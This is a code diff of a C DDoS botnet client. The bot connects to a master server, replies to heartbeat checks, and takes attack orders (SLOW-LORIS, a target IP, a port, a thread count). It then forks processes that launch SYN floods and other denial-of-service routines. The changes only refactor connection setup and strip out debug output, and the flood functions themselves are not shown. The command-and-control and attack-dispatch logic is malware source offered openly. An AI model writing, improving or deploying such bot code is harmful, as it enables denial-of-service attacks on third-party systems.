@@ -31,9 +31,8 @@ void wait_and_close(int f_write)
 		}else if(strstr(data, "[!DDOS!]") != NULL){
 			// Run the exit stuff here
 			write(f_write, "EXIT", 4);
-			printf("Exit current DDOS recieved\n");
 			close(f_write);
-			connect_to_master(BOT_MASTER, 15551);
+			return;
 		}
 	}
 }
@@ -69,9 +68,6 @@ void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url)
 			// closes the output to write to.
 			close(msg_pipe[1]);
 			flood_with_syn(target_ip, port, n_thrds, msg_pipe[0]);
-			//DEBUG
-			printf("Exiting From fork\n");
-			exit(0);
 		}else{
 			// closes the input to recv from.
 			close(msg_pipe[0]);
@@ -99,14 +95,14 @@ void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url)
 
 }
 
-void init()
+void init(char *to_con, int port)
 {
 	main_sock = make_socket();
 	connect_to(main_sock, to_con, port, &server);
 	printf("\033[0;35m[+] Connected to %s \033[0m\n", to_con);
 }
 
-void connect_to_master(char *to_con, int port)
+void connect_to_master()
 {
 	int bytes;
 	char data_recved[80];
@@ -133,11 +129,7 @@ void connect_to_master(char *to_con, int port)
 			printf("Shutdown signal from Master\n");
 			_exit(0);
 		}else if(strncmp(data_recved, "UP?", 3) == 0){
-			// DEBUG
-			printf("Server asked if we are up.\n");
 			sendto(main_sock, "?YES!", 5, 0, (struct sockaddr*)&server, sizeof(struct sockaddr_in));
-		}else if(strncmp(data_recved, "STARTED", 7) == 0){
-			printf("[+] Server is Up and Running\n\tWaiting for server requests");
 		}else if(strncmp(data_recved, "SLOW-LORIS", 10) == 0){
 			type = SLOW_LORIS;
 
@@ -207,7 +199,6 @@ void connect_to_master(char *to_con, int port)
 			// DEBUG
 			printf("Threads: %s\n", thrds);
 
-			// ******SERIOUS****** add the fucntionality for multiple DDOS types.
 			DDOS(type, target_ip, atoi(s_port), atoi(thrds), target_url);
 
 		}
@@ -246,9 +237,9 @@ int main(int argc, char const *argv[])
 
 	printf("\033[0;32m[+] Initializing the Bot!\033[0m\n");
 	
-	init();
+	init(BOT_MASTER, 15551);
 	// Change the IP when compiling.
-	connect_to_master(BOT_MASTER, 15551);
+	connect_to_master();
 
 	return 0;
 }
